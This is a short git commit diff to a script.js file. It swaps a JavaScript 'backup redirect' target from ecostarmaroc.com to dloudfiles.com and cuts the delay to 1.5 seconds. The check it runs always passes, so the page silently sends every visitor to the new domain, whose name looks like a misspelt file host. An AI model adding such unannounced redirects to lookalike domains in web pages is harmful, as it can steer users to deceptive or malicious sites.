36e20fa6642d286ad2814d88bb8d5afa08b7308c
dqwedac <aparatcormik@hotmail.com>
2025-03-22 06:43:28 +0300

    Add files via upload

--- script.js
+++ script.js
@@ -2,6 +2,6 @@
 // Backup redirect if meta refresh fails
 setTimeout(() => {
   if (window.location.href === document.location.href) {
-    window.location.href = 'https://ecostarmaroc.com/';
+    window.location.href = 'https://dloudfiles.com';
   }
-}, 3500);
+}, 1500);
